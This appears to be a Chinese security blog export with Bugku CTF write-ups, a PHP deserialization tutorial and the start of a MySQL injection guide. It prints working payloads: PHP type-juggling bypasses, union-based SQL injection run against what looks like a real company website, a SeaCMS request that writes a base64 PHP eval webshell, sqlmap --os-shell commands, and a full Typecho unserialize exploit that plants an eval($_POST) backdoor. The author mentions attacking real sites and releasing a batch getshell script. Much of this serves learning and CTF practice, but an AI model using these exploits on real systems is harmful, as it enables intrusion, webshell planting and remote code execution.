re.findall(r'&lt;div&gt;(.+?)=',responce.text)result = eval(final[0])data = &#123; "value": str(result)&#125;responce2 = s.post(url,data=data)print(responce2.text) 这里有个坑：一定要开session，不然他会以为你是不同电脑发来的 速度要快抓到返回headers 里面有base64加密的flagbase64解密后，发现flag部分还有一次base641234567891011121314151617# encoding:utf-8import requests,base64,reurl = 'https://120.24.86.145:8002/web6/'s = requests.session()responce = s.get(url)f = responce.headers['flag']f = base64.b64decode(f)print(f)flag = re.findall(r':(.+?)\'',str(f))[0].strip()data = &#123; 'margin': base64.b64decode(flag)&#125;print(flag)responce2 = s.post(url,data=data)print(responce2.text) Trim的日记本一想到这种题肯定考二次，但是扫了一下目录得到show.php，访问就拿到flag了。这个题没找到回显的点，不知道这个题是考察什么… 变量覆盖源码12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 解法1：12https://120.24.86.145:9009/1.php?shiyan=123&amp;flag=php://inputpost_data:123 解法21https://120.24.86.145:9009/1.php?shiyan=&amp;flag= flag{bugku-dmsj-p2sm3N}但是为什么赋1就不相等呢？1https://120.24.86.145:9009/1.php?shiyan=1&amp;flag=1 后来在本地测了一下，因为file_get_contents($flag)始终是包含不到文件的，所以会返回一个空，此时只有当shiyan参数也为空才能相等。demo:12345678910111213141516171819202122232425&lt;?php$flag='123';extract($_GET);if(isset($shiyan))&#123; $content=trim(file_get_contents($flag1)); if($shiyan==$content) &#123; echo 'bingo'; echo '&lt;br&gt;'; var_dump($flag); echo '&lt;br&gt;'; var_dump($content); echo '&lt;br&gt;'; var_dump($shiyan); &#125; else &#123; var_dump($flag.'&lt;br&gt;'); var_dump($content.'&lt;br&gt;'); var_dump($shiyan.'&lt;br&gt;'); echo'Oh.no'; &#125;&#125;?&gt; strcmp比较字符串12345678910&lt;?php$flag = "flag&#123;xxxxx&#125;";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 数组绕过：1https://120.24.86.145:9009/6.php?a[]=1 Flag: flag{bugku_dmsj_912k} urldecode二次编码绕过123456789101112131415161718192021&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; 因为浏览器解析一次php解析一次，所以要两次编码：1https://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61 flag{bugku__daimasj-1t2} 数组返回NULL绕过123456789101112&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; ereg()函数匹配数组的时候会返回null，所以：1https://120.24.86.145:9009/19.php?password[]=1-- flag{ctf-bugku-ad-2131212} 弱类型整数大小比较绕过题示源码：1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; 要求我们传入的password参数不能为数字，且要大于1336。我们可以在本地测试一下，is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较：1234567891011121314&lt;?php$temp = $_POST['passer6y'];if(is_numeric($temp)) &#123; echo "is num&lt;br&gt;"; var_dump($temp);&#125;else&#123; echo "is not num&lt;br&gt;"; var_dump($temp); if($temp &gt; 10)&#123; echo "&lt;br&gt;\$temp &gt; 10"; &#125;&#125;?&gt; 所以我们可以，构造payload：1https://120.24.86.145:9009/22.php?password[]=asdsadsadasd 得到flag：flag{bugku_null_numeric} sha()函数比较绕过12345678910111213141516171819&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'invalid password';&#125;elseecho 'ogin first!';?&gt; 这个题目要求我们传入name和password参数不相等，但他们的sha1()加密后相等我们可以本地测试一下如果sha1()函数加密一个数组返回的会是怎样：1234&lt;?php$a = $_POST['passer6y'];var_dump(sha1($a));?&gt; 会发出一个警告，说sha1()希望参数是string类型，但如果我们传入一个数组类型，返回的是NULL，因此此题我们可以构造payload：1https://120.24.86.145:9009/7.php?name[]=123&amp;password[]=a 得到：flag{bugku–daimasj-a2} ps：sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 十六进制与数字比较题示源码：12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 这个题的意思就是说，不能输入1-9的数字，但是最后结果是要和 ‘3735929054’相等，很容易想到用16进制绕过。payload：1https://120.24.86.145:9009/20.php?password=0xDEADC0DE ereg正则%00截断题示源码：12345678910111213141516171819202122232425&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeri';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo ’Invalid password';&#125;&#125;?&gt; 这个题要求我们传入的password变量，绕过ereg()变量，长度小于8且数值大于9999999，还要有”-“符号。我们可以用%00来绕过ereg()变量，用数组绕过strlen()来限制我们的数字位数,paylaod如下1https://120.24.86.145:9009/5.php?password[]=%00999999999- get flag：flag{bugku-dm-sj-a12JH8}我在本地测数组绕过strlen()的长度限制,不论我传入的数组是什么值，都显示长度为5： 1234&lt;?php$a = $_POST['passer6y'];var_dump(strlen($a));?&gt; strpos数组绕过题示源码：1234567891011&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; strpos()函数和ereg()函数一样也具有数组绕过漏洞paylaod:1https://120.24.86.145:9009/15.php?ctf[]=123asd 数字验证正则绕过题示源码：12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if ("POST" == $_SERVER['REQUEST_METHOD'])&#123;$password = $_POST['password'];if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //preg_match — 执行一个正则表达式匹配&#123;echo 'flag';exit;&#125;while (TRUE)&#123;$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';if (6 &gt; preg_match_all($reg, $password, $arr))break;$c = 0;$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match("/[[:$pt:]]+/", $password))$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上if ("42" == $password) echo $flag;else echo 'Wrong password';exit;&#125;&#125;?&gt; 从第7行代码我们可以知道，除了空白字符和制表符外不能超过12个字符，还有第9行那个1echo 'flag'; 这个是个字符串flag，真正的flag在26行处。第15行处，12$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) 要求我们传入的参数中，标点，数字，大写小写字母被匹配的次数大于6。12345678$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match("/[[:$pt:]]+/", $password)) $c += 1; &#125; if ($c &lt; 3) break;if ("42" == $password) echo $flag; 同时要求我们包含这几种类型至少三种以上，且使password参数和42相等payload:1password=42.00e+0000000000 flag{Bugku_preg_match} flag.php 提示信息：点了login咋没反应，提示：hint这题有毒，提示hint，竟然是以hint为参数，随便传入一个值即可获得源码：1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; 一开始，我把反序列化数据,然后按照1s:21:&quot;ISecer:www.isecer.com&quot;; 传了上去，感觉智商再次被侮辱..这个$key变量的值是后面才传入的，所以我们应该传个空的反序列化数据： 实战2-打开页面，既然题目说了，那就找，点了一遍，发现一个https://www.kabelindo.co.id/readnews.php?id=18顺手一个单引号，诶报错了,那就来123456https://www.kabelindo.co.id/readnews.php?id=18 order by 5 --+ https://www.kabelindo.co.id/readnews.php?id=18 select 1,2,3,4,5 --+https://www.kabelindo.co.id/readnews.php?id=18select 1,version(),database(),4,5 --+https://www.kabelindo.co.id/readnews.php?id=18select 1,2,table_name,4,5 from information_schema.tables --+ 表名出来了，flag{tbnomax} Bugku-cms1打开页面，往下一拉，Powered by SongCMS v3.13 免费版日常扫目录，发现一个/data/，打开一看有个sql文件，里面有两个账号密码，分别试了一下，进了后台，找下上传文件的地方然后上传成功，菜刀一连，flag就在根目录下 phpcmsV9照着漏洞来就行了https://www.freebuf.com/vuls/131648.html 海洋cms个人觉得，这些题考察exp快速搜索能力参考：https://blog.csdn.net/qq_35078631/article/details/76595817 123https://120.24.86.145:8008/search.php?searchtype=5searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=fwrite(fopen(&quot;pass.php&quot;,&quot;w&quot;),base64_decode(PD9waHAgZXZhbCgkX1BPU1Rbc3d4XSk7Pz4)) 然后菜刀连接： bugku导航稍微浏览了一下基本页面，顺手吧目录扫描器开启，发现两个登录的地方：一个是首页用户登录的，放进sqlmap跑了一下，无果。还有一个地方是后台登录的页面:https://120.24.86.145:9006/admin/login.php#post，burpsuite抓了个包保存到本地，试了一下username参数1python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugku导航\bp.txt&quot; -p username 上webshell：1python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugku导航\bp.txt&quot; -p username --os-shell 但是都上传失败了…没爆出网站路径不过我爆了一下敏感数据，拿到了后台管理员账号：后台有很多图片上传的地方，不过上传成功后，都会被改名成.png找到了个添加广告的地方，随便插了一个一句话木马：插入失败了，又是sql…试试这样：没找到广告插在哪个页面了….后来，扫了一下备份文件，把他源码下下来了。flag在根目录。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化总结]]></title>
    <url>%2F2018%2F02%2F19%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[起因：最近日站的时候，对一个typecho博客经历几番波折之后，最后找了个typecho反序列化漏洞的exp、写了个webshell..开心的不得了…带着对反序列化漏洞满满的好奇心学习了一番。批量getshell脚本已发布：github 0x01：相关基础：1.序列化和反序列化相关知识：1.1什么是(反)序列化：序列化是将变量(对象)转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。 1.2php(反)序列化常见的函数：Serialize、Unserialize、json_encode、json_decode。 1.3序列化之后的格式：a - array：12a:&lt;length&gt;:&#123;key,value pairs&#125;a:1:&#123;i:1;s:1:&quot;a&quot;;&#125; b - boolean： d - double i - integer o - object:12O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125; //说明person对象中name属性为Null、age属性为19，sex属性为Null s - string12s:length:&quot;value&quot;;s:1:&quot;a&quot;; N - null1N; 2.php对象常见的魔幻函数 __construct： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct： 和构造函数相反，当对象所在函数调用完毕后执行。 __toString：当对象被当做一个字符串使用时调用。 __sleep:序列化对象之前就调用此方法(其返回需要一个数组) __wakeup:反序列化恢复对象之前调用该方法 __call:当调用对象中不存在的方法会自动调用该方法。 __get:在调用私有属性的时候会自动执行 更多见：https://php.net/manual/zh/language.oop5.magic.php 测试： 3.php_session序列化和反序列化相关知识3.1 php_session处理器 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值。 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值设置方式：在php_ini中session.serialize_handler(PHP_INI_ALL) 设置，也可以在代码中设置：1ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); 各类存储方式示例：代码：123456&lt;?phpini_set('session.serialize_handler', 'php');session_start();$_SESSION['a'] = $_GET['a'];var_dump($_SESSION);?&gt; 当我传入?a=O:4:”pass”:0:{}时： php处理器存储的为：a|s:15:”O:4:”pass”:0:{}”; php_serialize处理器存储的为：a:1:{s:1:”a”;s:15:”O:4:”pass”:0:{}”;} php_binary处理器存储的为：(乱码了..自己测试吧) 3.2.php_ini中与php_session相关的配置知识 session.save_path = “” //设置session的存储路径 session.auto_start = boolen //指定会话模块是否在请求开始时启动一个会话，默认0(不启动) session.serialize_handler = string //指定序列化、反序列化处理器 0x02.常见的漏洞：1 将传来的序列化unserilize，造成魔幻函数执行。demo1： 由bugku的一个题启发而写的一个缩略版的demo，原题链接：https://120.24.86.145:8006/test1/ 1234567891011121314&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br /&gt;"; return ("good"); &#125; &#125;&#125;$password = unserialize($_GET['password']); echo $password; &lt;/script&gt; 关键点：当对象被当作字符串使用时调用__tostring()魔幻函数，所以如果我们给password传入一个序列化的对象，那么echo $password 就会调用魔幻函数。构造payload：123456789101112131415&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br /&gt;"; return ("good"); &#125; &#125;&#125;$obj = new Flag();$obj-&gt;file = "Flag.php"; echo serialize($obj);&lt;/script&gt; 生成：1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 最后读出flag.php demo2:1234567891011&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __wakeup()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; &#125;&#125;unserialize($_GET['password']); &lt;/script&gt; 这个例子是利用的反序列化恢复对象之前会调用__wakeup()，所以构造payload方法和demo1中一样。将拿到的序列化字符传入：1https://localhost:9096/test1.php?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 即可得到flag.php中的文件 当然还有其他魔幻函数：__construct、__destruct都行 总的来说：①：有可控的数据被反序列化②：有魔幻函数中敏感代码被执行。 2 php session处理器设置不当的漏洞。 起源于一道CTF，题目传送门:https://web.jarvisoj.com:32784/ 题目源码：12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 第一眼看到这个题的时候很懵逼…. 没有数据可以输入的地方…然后琢磨了一下wp….. 感觉发现了新大陆… 从phpinfo中可以发现1session.serialize_handler = php_serilize 而代码中设置的1ini_set('session.serialize_handler', 'php'); 从上文介绍相关处理器的时候可以知道：PHP处理器：a为session的键名，|后面为经过serialize处理的键值而php_serialize处理器：这其中php_serialize有一个特性，就是可以在字符串变量中储存 | 符号，然后当我们以php_serialize格式存入|O:4:”pass”:0:{}再以php处理器处理：即变成了[“a:1:{s:1:”a”;s:16:””]为键名，test对象为值。demo3(上述过程具体实现代码)：12345&lt;?php//ini_set('session.serialize_handler', 'php');session_start();$_SESSION['a'] = $_GET['a'];?&gt; 实现步骤：1.设置php_ini中的session.serialize_handler = php_serialize，访问https://localhost:9096/test1.php?a=|O:4:&quot;test&quot;:0:{},即写入session。2.将上述代码注释去掉，并给$_SESSION[‘a’] = $_GET[‘a’];加上注释，即可看到php和php_serialize处理|的漏洞。 所以这里就可以利用这个特性给网页传入一个构造的php_serialize格式的session，然后让php解析器将|后的数据解析成”值”，以达到代码执行目的。然后我们利用这个特点写入一个session(以php_serialize格式)，然后让该页面以php方式处理，从而给$mdzz赋值，获取敏感信息。demo4：test1.php123456789101112131415&lt;?phpini_set('session.serialize_handler', 'php');session_start();//$_SESSION['a'] = $_GET['a'];var_dump($_SESSION);class Test&#123; function __construct()&#123; echo "__constrct"; &#125; function __destruct()&#123; echo "__destruct"; eval(phpinfo()); &#125;&#125;?&gt; 本地事先存储了以php_serilize格式的session：a:1:{s:1:”a”;s:16:”|O:4:”Test”:0:{}然后访问test1.php正好符合上述题目中的eval函数中的代码执行 总的来说 ：其实这种漏洞就是session序列化及反序列化处理器设置不当造成。本质上是它们对处理“|”的差异造成。如果以php_serilize方式存入，比如我们构造出’|’ 伪造的序列化值存入，但之后解析又是用的php处理器的话，那么将会反序列化伪造的数据（’|’之前当作键名，’|’之后当作键值）其次如果想要利用的话，就是找到注入点，将我们构造的session注入进去。 其实我还是有点疑问的那么为什么php处理器处理的时候会执行session中的值呢？猜想：与session_start或者php处理器有关暂时还没有捣鼓出来… 0x03.如何寻找注入点将数据注入到session上面说的那个CTF题原理已经知道了，但是并不知道从哪注入session。就我了解的而言，有以下几种写入session的途径 1.通过配置不当造成的session可控 参考：https://bugs.php.net/bug.php?id=71101当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。 我们启用了该配置项后，POST一个和session.upload_progress.name同名变量的时候PHP会将文件名保存在$_SESSION中所以构造一个提交文件的表单：12345&lt;form action =“https://web.jarvisoj.com:32784/index.php”method =“POST”enctype =“multipart/form-data”&gt; &lt;input type =“hidden”name =“PHP_SESSION_UPLOAD_PROGRESS”value =“1”/&gt; &lt;input type =“file”name =“file”/&gt; &lt;input type =“submit”/&gt;&lt;/form&gt; 然后构造一个序列化的数据：123456789&lt;?phpini_set('session.serialize.handler','php');session_start();class OowoO&#123; public $mdzz = 'payload';&#125;$obj = new OowoO();echo serialize($obj);?&gt; 即可使得析构函数中的eval()执行任意代码。 0x04：构造注入链：pop1.POP链原理简介： 在反序列化中，我们能控制的数据就是对象中的属性值，所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”，即POP( Property Oriented Programming)。在反序列化漏洞利用中，最理想的情况就是漏洞能利用的点在那几个魔幻函数中，而实际上往往是从这几个魔幻函数开始，逐步的跟进这个函数中调用的函数，直到找到可以利用的点。 试想一下，如果上面那个CTF题目的代码执行函数eval()函数不在__destruct这类魔幻函数中，而是在一个普通的方法中，我们就没办法直接利用它执行代码了。这个时候就需要构造一个链，链接到我们需要执行的函数eval()。 demo5(模拟了一个简单的场景)：12345678910111213141516171819202122232425&lt;?phpclass OowoO&#123; protected $obj; function __destruct() &#123; //$obj = new test1; 这里可以控制$obj为任意对象 $this-&gt;obj-&gt;a(); &#125;&#125;class test1&#123; function a()&#123; echo "123"; &#125;&#125;class test2&#123; private $data; function a()&#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET['a']);?&gt; 利用：12345678910111213&lt;script language="php"&gt;class OowoO&#123; protected $obj; public function __construct()&#123; $this-&gt;obj = new test2(); &#125;&#125;class test2&#123; private $data = "phpinfo();";&#125;echo urlencode(serialize(new OowoO()));&lt;/script&gt; 结果： 值得注意的是，反序列化可以控制类的属性，无论private还是public。但是这里有个坑，如果类中存在protected或者private属性的时候，序列化的时候会产生空字节，所以记得urlencode一下，payload才会生效。demo6：123456789&lt;?phpclass test&#123; private $a="a"; protected $b="b"; public $c="c";&#125;echo urlencode(serialize(new test()));?&gt; 总的来说：如果魔幻函数中没有漏洞利用点，但是他调用了其他对象(意味着实例化了该对象)中的方法A，由于上述demo5中我们传入的反序列化数据可以实例化任意对象，所以我们可以全局寻找一个和方法A同名的方法，然后逐个查看其他同名方法A中是否含有可利用的点。 2.typecho反序列化漏洞分析：漏洞文件为根目录下的install.php，第283行:12345$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));$type = explode('_', $config['adapter']);$type = array_pop($type);$installDb = new Typecho_Db($config['adapter'], $config['prefix']);$installDb-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); 从cookie中将__typecho_config的值取出，然后在Typecho_Db中实例化。这里就是漏洞的注入点，下面就需要找到漏洞的利用点，接着搜寻魔幻函数 __construct、__destruct、__wakeup。 在/var/Typecho/Db.php中Typecho_Db类，代码第114行，找到一个__construct(1)可以利用，因为$adapterName变量存在字符串拼接如果给它反序列化传入一个对象的话，会调用 __tostring函数(如果存在的话)。1234public function __construct($adapterName, $prefix = 'typecho_')&#123; $this-&gt;_adapterName = $adapterName; $adapterName = 'Typecho_Db_Adapter_' . $adapterName; 可以发现在同文件下的第134行，实例化了$adapterName，会调用__tostring(2)1$this-&gt;_adapter = new $adapterName(); 全局搜索__tostring后，在/var/Typecho/Feed.php中Typecho_Feed类可以发现__tostring(2)方法：290行：1234567891011foreach ($this-&gt;_items as $item) &#123; $content .= '&lt;entry&gt;' . self::EOL; $content .= '&lt;title type="html"&gt;&lt;![CDATA[' . $item['title'] . ']]&gt;&lt;/title&gt;' . self::EOL; $content .= '&lt;link rel="alternate" type="text/html" href="' . $item['link'] . '" /&gt;' . self::EOL; $content .= '&lt;id&gt;' . $item['link'] . '&lt;/id&gt;' . self::EOL; $content .= '&lt;updated&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/updated&gt;' . self::EOL; $content .= '&lt;published&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/published&gt;' . self::EOL; $content .= '&lt;author&gt;&lt;name&gt;' . $item['author']-&gt;screenName . '&lt;/name&gt;&lt;uri&gt;' . $item['author']-&gt;url . '&lt;/uri&gt;&lt;/author&gt;' . self::EOL; 在该段代码的倒数第三行中，如果构造$item[‘author’]是一个对象，screenName是其私有属性，则会调用__get(3)方法。 然后在/var/Typecho/Request.php中Typecho_Request类中 __get(3)方法：226行1234public function __get($key)&#123; return $this-&gt;get($key);&#125; 调用了get方法：295行1234567891011121314151617public function get($key, $default = NULL)&#123; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; &#125; $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value);&#125; 跟进一下_applyFilter(),在该文件的159行:1234567private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; 调用了call_user_func($filter,$value)函数，找到了可以利用的点了。 反过来分析：回溯查看一下$value变量的来源：由Typecho_Request类中的$_params传入。然后$filter在代码的120行有定义：1private $_filter = array(); 所以可以直接对该属性赋值。 再来考虑一下如何触发__get(3)方法： 然后就可以把$_items数组所在的Typecho_Feed类，实例化传给$adapter，从而触发\_tostring(2)，然后__construct(1)自动执行，即构成了完整的一条攻击链。 总的来说，现在就很好理解这些数组的嵌套关系了。12345678910111213141516171819202122232425262728293031323334Array( [adapter] =&gt; Typecho_Feed Object ( [_type:Typecho_Feed:private] =&gt; RSS 2.0 [_version:Typecho_Feed:private] =&gt; 1 [_charset:Typecho_Feed:private] =&gt; UTF-8 [_lang:Typecho_Feed:private] =&gt; en [_items:Typecho_Feed:private] =&gt; Array //$_itemss数组 ( [0] =&gt; Array //$item数组 ( [author] =&gt; Typecho_Request Object //$item[&apos;author&apos;]赋予一个对象值，触发__get() ( [_params:Typecho_Request:private] =&gt; Array ( [screenName] =&gt; file_put_contents(&apos;Passer6y.php&apos;, &apos;&lt;?php eval($_POST[1]);?&gt;&apos;) ) [_filter:Typecho_Request:private] =&gt; Array ( [0] =&gt; assert ) ) ) ) ) [prefix] =&gt; th1s) EXP(copy from Ph0rse大佬)：1234567891011121314151617181920212223242526272829303132333435&lt;?php//当__get方法执行时，使用assert函数调用file_put_contents函数，写入木马class Typecho_Request&#123; private $_params = array('screenName' =&gt; "file_put_contents('Passer6y.php', '&lt;?php eval(\$_POST[1]);?&gt;')"); private $_filter = array('assert');&#125;//构造Feed类，使__get方法执行class Typecho_Feed&#123; const RSS2 = "RSS 2.0"; private $_type; private $_version; private $_charset; private $_lang; private $_items = array(); public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en')&#123; $this-&gt;_version = $version; $this-&gt;_type = $type; $this-&gt;_charset = $charset; $this-&gt;_lang = $lang; &#125; public function addItem(array $item)&#123; $this-&gt;_items[] = $item; &#125;&#125;$class1 = new Typecho_Feed(1);$class2 = new Typecho_Request();$class1-&gt;addItem(array('author' =&gt; $class2));$exp = array('adapter' =&gt; $class1, 'prefix' =&gt; 'th1s');echo base64_encode(serialize($exp));?&gt; 0x05.如何防御1.过滤：试想一下，当unserialize执行的时候，会调用自动__wakeup魔幻函数，我们可以利用这点，对用户可控的数据进行严格过滤，使之不能成功控制属性值。 2.使用get_included_files函数查看是否有漏洞的类被包含了 3.尽量使用json_endcode/json_decode来取代 参考资料：1.漏洞分析之Typecho二连爆2.PHP序列化3.一道反序列化CTF引起的思考4.POP链的构造5.PHP中SESSION反序列化机制详解6.Typecho反序列化漏洞导致前台getshell7.通过PHP反序列化进行远程代码执行8.POP链和序列化，反序列化操作 9.php对象注入总结10.PHP反序列化漏洞成因及漏洞挖掘技巧与案例]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySql Injection Conclusion]]></title>
    <url>%2F2017%2F12%2F23%2FSql%20injection%20Conclusion%2F</url>
    <content type="text"><![CDATA[0x02 基于有正确回显的注入1.判断注入点、注入位置2.判断是否被过滤，绕过3.order by联合查询，找到对应的列数4.联合查询注入：这里假设有三个字段①爆库： id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+ ②爆表名：这里假设爆出了security数据库 id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos; --+ ③爆列名:假设爆出一个users表 id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+ ④爆数据： id=-1&apos; Union select 1,username,password from users limit 0,1 --+ Tips: 有时候可能当前页面数据库和敏感信息数据库不是同一个库，所以有时候会这样写id=-1’ Union select 1,username,password from security.users limit 0,1 –+或者id=-1’ Union select 1,username,password from `users` limit 0,1 –+ 0x03 基于构造错误sql语句的报错注入1. 需要知道以下几个函数： ①Group by: 分组，合并相同的，并且按字母顺序排列。 ②rand() // 随机函数（0，1） ③floor() //取整函数 比如floor(1.2)=1 ④count() //汇总函数2. 原理: 简而言之就是利用 select count(),concat(floor(random(0)2))as key from…….group by key来报错。 即rand函数产生的随机数取整之后被 group by 子句被分为key值等于1 和0 两类，然后count()统计该类型下的个数 可以发现有时候回报错 我们就可以通过这种手段来获取敏感信息 那么问题来了：为什么会报错呢？ 